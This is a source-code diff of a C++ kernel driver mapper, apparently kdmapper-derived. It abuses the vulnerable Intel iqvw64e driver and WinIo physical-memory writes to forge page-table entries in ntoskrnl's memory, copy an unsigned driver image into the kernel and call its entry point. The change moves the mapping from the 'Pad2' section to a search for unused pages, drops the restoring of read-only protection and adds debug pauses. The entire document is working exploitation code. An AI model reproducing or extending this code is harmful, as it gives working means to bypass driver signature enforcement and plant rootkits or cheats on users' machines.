@@ -26,27 +26,22 @@ uint64_t mapping_utils::MapDriver(HANDLE iqvw64e_device_handle, HANDLE winio_han
 
 	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
 
-	uintptr_t Pad2 = intel_driver::FindSectionAtKernel(iqvw64e_device_handle, "Pad2", intel_driver::ntoskrnlAddr, NULL) + 0x1000;
-	uintptr_t datasec = intel_driver::FindSectionAtKernel(iqvw64e_device_handle, ".data", intel_driver::ntoskrnlAddr, NULL);
-	size_t pad2size = ((datasec - Pad2) / 0x1000) - 1;
+	uintptr_t ntoskrnl_final_section = intel_driver::FindSectionAtKernel(iqvw64e_device_handle, ".reloc", intel_driver::ntoskrnlAddr, NULL);
+	uintptr_t ntoskrnl_mem_size = ntoskrnl_final_section - intel_driver::ntoskrnlAddr;
 
-	uint64_t kernel_image_map_base = Pad2;
+	std::cout << "start -> " << std::hex << intel_driver::ntoskrnlAddr << std::endl;
+	std::cout << "end -> " << std::hex << ntoskrnl_final_section << std::endl;
+	std::cout << "size -> " << std::hex << ntoskrnl_mem_size << std::endl;
 
-	if (pad2size < image_pages)
-	{
-		Log(L"[-] Section too small to map over!\n");
+	uintptr_t pt_start, va, pt_idx;
+	if (!pt_utils::find_unused_mem(winio_handle, image_pages, intel_driver::ntoskrnlAddr, ntoskrnl_mem_size, pt_start, va, pt_idx))
 		return 0;
-	}
-	std::cout << "Pad2 -> " << std::hex << Pad2 - 0x1000 << " (" << (pad2size) << ")" << std::endl;
 
-	ULONG_PTR* physical_pages = (ULONG_PTR*)HeapAlloc(GetProcessHeap(), 0, image_pages * sizeof(ULONG_PTR));
-	pt_utils::allocate_nonpageable_memory(image_pages, physical_pages);
+	VA va_comp = pt_utils::split_virtual_address(va);
 
 	// insert physical pages into empty pad section
-	uintptr_t pad_pt = drv_utils::get_pt_from_va(winio_handle, Pad2, system_dtb);
-	std::cout << pad_pt << std::endl;
-
-	VA va_comp = pt_utils::split_virtual_address(Pad2);
+	ULONG_PTR* physical_pages = (ULONG_PTR*)HeapAlloc(GetProcessHeap(), 0, image_pages * sizeof(ULONG_PTR));
+	pt_utils::allocate_nonpageable_memory(image_pages, physical_pages);
 
 	for (int i = 0; i < image_pages; i++)
 	{
@@ -56,8 +51,12 @@ uint64_t mapping_utils::MapDriver(HANDLE iqvw64e_device_handle, HANDLE winio_han
 		new_pte.ReadWrite = 1;
 		new_pte.PageFrameNumber = physical_pages[i];
 
-		winio_driver::WritePhysicalMemory(winio_handle, pad_pt + ((i + va_comp.pte) * sizeof(uintptr_t)), (uint8_t*)&new_pte, sizeof(new_pte));
+		winio_driver::WritePhysicalMemory(winio_handle, pt_start + ((i + va_comp.pte) * sizeof(uintptr_t)), (uint8_t*)&new_pte, sizeof(new_pte));
 	}
+	
+	system("pause");
+
+	uintptr_t kernel_image_map_base = va;
 
 	if (!kernel_image_map_base) {
 		Log(L"[-] Failed to allocate remote image in kernel" << std::endl);
@@ -90,43 +89,39 @@ uint64_t mapping_utils::MapDriver(HANDLE iqvw64e_device_handle, HANDLE winio_han
 
 		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_map_base - nt_headers->OptionalHeader.ImageBase);
 
+		system("pause");
+
 		if (!FixSecurityCookie(local_image_base, kernel_image_map_base))
 		{
 			Log(L"[-] Failed to fix cookie" << std::endl);
 			return 0;
 		}
 
-		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base))) 
+		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base)))
 		{
 			Log(L"[-] Failed to resolve imports" << std::endl);
 			kernel_image_map_base = realBase;
 			break;
 		}
 
+		system("pause");
+
 		// Write fixed image to kernel
-		if (!intel_driver::WriteMemory(iqvw64e_device_handle, kernel_image_map_base, local_image_base, image_size)) 
+		if (!intel_driver::WriteMemory(iqvw64e_device_handle, kernel_image_map_base, local_image_base, image_size))
 		{
 			Log(L"[-] Failed to write local image to remote image" << std::endl);
 			kernel_image_map_base = realBase;
 			break;
 		}
 
-		// unpatch that shit (absolute ghetto)
-		for (int i = 0; i < image_pages; i++)
-		{
-			PTE new_pte = {};
-			new_pte.Value = 0;
-			new_pte.Present = 1;
-			new_pte.ReadWrite = 0;
-			new_pte.PageFrameNumber = physical_pages[i];
-
-			winio_driver::WritePhysicalMemory(winio_handle, pad_pt + ((i + va_comp.pte) * sizeof(uintptr_t)), (uint8_t*)&new_pte, sizeof(new_pte));
-		}
+		system("pause");
 
 		// Call driver entry point
 		const uint64_t address_of_entry_point = kernel_image_map_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
 
 		Log(L"[<] Calling DriverEntry 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl);
+
+		system("pause");
 
 		NTSTATUS status = 0;
 		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point, realBase, NULL, intel_driver::ntoskrnlAddr)) {
@@ -137,6 +132,8 @@ uint64_t mapping_utils::MapDriver(HANDLE iqvw64e_device_handle, HANDLE winio_han
 
 		Log(L"[+] DriverEntry returned 0x" << std::hex << status << std::endl);
 
+		system("pause");
+
 		VirtualFree(local_image_base, 0, MEM_RELEASE);
 		return realBase;
 	} while (false);
@@ -144,6 +141,7 @@ uint64_t mapping_utils::MapDriver(HANDLE iqvw64e_device_handle, HANDLE winio_han
 	VirtualFree(local_image_base, 0, MEM_RELEASE);
 	return 0;
 }
+
 void mapping_utils::RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta)
 {
 	for (const auto& current_reloc : relocs) {
